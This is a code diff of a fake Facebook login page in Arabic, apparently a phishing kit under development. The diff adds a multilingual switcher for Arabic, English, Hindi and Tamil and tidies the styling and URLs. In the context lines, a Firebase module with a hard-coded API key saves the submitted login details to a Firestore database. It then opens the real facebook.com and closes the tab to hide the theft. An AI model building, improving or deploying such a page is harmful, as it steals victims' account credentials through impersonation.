@@ -19,14 +19,9 @@
     button:active{background:#166fe5}
     .link{display:block;text-align:center;margin-top:16px;font-size:14px;color:#1877f2;text-decoration:none}
     .divider{height:1px;background:#ddd;margin:20px 0}
-    .
-
-.create-btn{width:380px;padding:12px;font-size:16px;font-weight:bold;color:#fff;background:#42B72A;border:none;border-radius:6px;cursor:pointer;margin:0 auto;display:block}
-.create-btn:active{background:#36981f}
-
-
-
- footer{margin-top:40px;font-size:12px;color:#8a8d91;text-align:center;line-height:1.4}
+    .create-btn{width:100%;max-width:380px;padding:12px;font-size:16px;font-weight:bold;color:#fff;background:#42B72A;border:none;border-radius:6px;cursor:pointer;margin:0 auto;display:block}
+    .create-btn:active{background:#36981f}
+    footer{margin-top:40px;font-size:12px;color:#8a8d91;text-align:center;line-height:1.4}
     footer a{color:#8a8d91;text-decoration:none;margin:0 4px}
     .meta{font-size:11px;color:#bec3c9;margin-top:8px}
   </style>
@@ -34,7 +29,7 @@
 <body>
   <!-- أيقونة ثابتة غير متداخلة -->
   <div class="logo-box">
-    <img src="https://img.freepik.com/photos-premium/logo-facebook_1080029-107.jpg?semt=ais_hybrid&w=740&q=80 " alt="Facebook">
+    <img src="https://img.freepik.com/photos-premium/logo-facebook_1080029-107.jpg?semt=ais_hybrid&w=740&q=80" alt="Facebook">
   </div>
 
   <h2>تسجيل الدخول إلى فيسبوك</h2>
@@ -49,22 +44,79 @@
 
   <div class="divider"></div>
 
-  <!-- زر إنشاء حساب جديد بنفس عرض زر الدخول -->
-<button class="create-btn" onclick="alert('سيتم توجيهك لاحقاً لصفحة الإنشاء')">إنشاء حساب جديد</button>
+  <button class="create-btn">إنشاء حساب جديد</button>
 
   <footer>
-    <div>
-      <a href="#">العربية</a>
-      <a href="#">English (UK)</a>
-      <a href="#">हिन्दी</a>
-      <a href="#">தமிழ்</a>
-    </div>
+<!-- داخل الـ footer -->
+<div id="langBar">
+  <a href="#" onclick="setLang('ar'); return false;">العربية</a>
+  <a href="#" onclick="setLang('en'); return false;">English (UK)</a>
+  <a href="#" onclick="setLang('hi'); return false;">हिन्दी</a>
+  <a href="#" onclick="setLang('ta'); return false;">தமிழ்</a>
+</div>
+
+<script>
+const dict = {
+  ar: {
+    title: "تسجيل الدخول إلى فيسبوك",
+    subtitle: "أدخل بياناتك للمتابعة",
+    email: "رقم الهاتف أو البريد الإلكتروني",
+    pass: "كلمة السر",
+    login: "تسجيل الدخول",
+    forgot: "هل نسيت كلمة السر؟",
+    create: "إنشاء حساب جديد",
+    meta: "Facebook Meta"
+  },
+  en: {
+    title: "Log in to Facebook",
+    subtitle: "Enter your details to continue",
+    email: "Phone number or email address",
+    pass: "Password",
+    login: "Log In",
+    forgot: "Forgotten password?",
+    create: "Create New Account",
+    meta: "Facebook Meta"
+  },
+  hi: {
+    title: "फ़ेसबुक में लॉग इन करें",
+    subtitle: "जारी रखने के लिए अपना विवरण दर्ज करें",
+    email: "फ़ोन नंबर या ईमेल पता",
+    pass: "पासवर्ड",
+    login: "लॉग इन करें",
+    forgot: "पासवर्ड भूल गए?",
+    create: "नया खाता बनाएँ",
+    meta: "Facebook Meta"
+  },
+  ta: {
+    title: "Facebook-இல் உள்நுழையவும்",
+    subtitle: "தொடர உங்கள் விவரங்களை உள்ளிடவும்",
+    email: "தொலைபேசி எண் அல்லது மின்னஞ்சல் முகவரி",
+    pass: "கடவுச்சொல்",
+    login: "உள்நுழையவும்",
+    forgot: "கடவுச்சொல் மறந்துவிட்டதா?",
+    create: "புதிய கணக்கு உருவாக்கவும்",
+    meta: "Facebook Meta"
+  }
+};
+
+function setLang(l){
+  const t = dict[l];
+  document.querySelector("h2").textContent = t.title;
+  document.querySelector(".subtitle").textContent = t.subtitle;
+  document.querySelector('input[type="text"]').placeholder = t.email;
+  document.querySelector('input[type="password"]').placeholder = t.pass;
+  document.querySelector('button[type="submit"]').textContent = t.login;
+  document.querySelector('.link').textContent = t.forgot;
+  document.querySelector('.create-btn').textContent = t.create;
+  document.querySelector('.meta').textContent = t.meta;
+}
+</script>
     <div class="meta">Facebook Meta</div>
   </footer>
   <!-- Firebase v9 -->
 <script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js ";
-  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js ";
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+  import { getFirestore, collection, addDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore.js";
 
   const firebaseConfig = {
     apiKey: "AIzaSyDwGqTQRikHsTqgO8Aid32JiKTiAJuswmo",
@@ -92,7 +144,7 @@
         timestamp: serverTimestamp()
       });
       // بعد الحفظ مباشرة: أغلق التاب وافتح فيسبوك
-      window.open("https://www.facebook.com ", "_blank");
+      window.open("https://www.facebook.com", "_blank");
       window.close();                         // أغلق التاب الحالي
     } catch {
       // في حال فشل الحفظ لا يفتح شيء
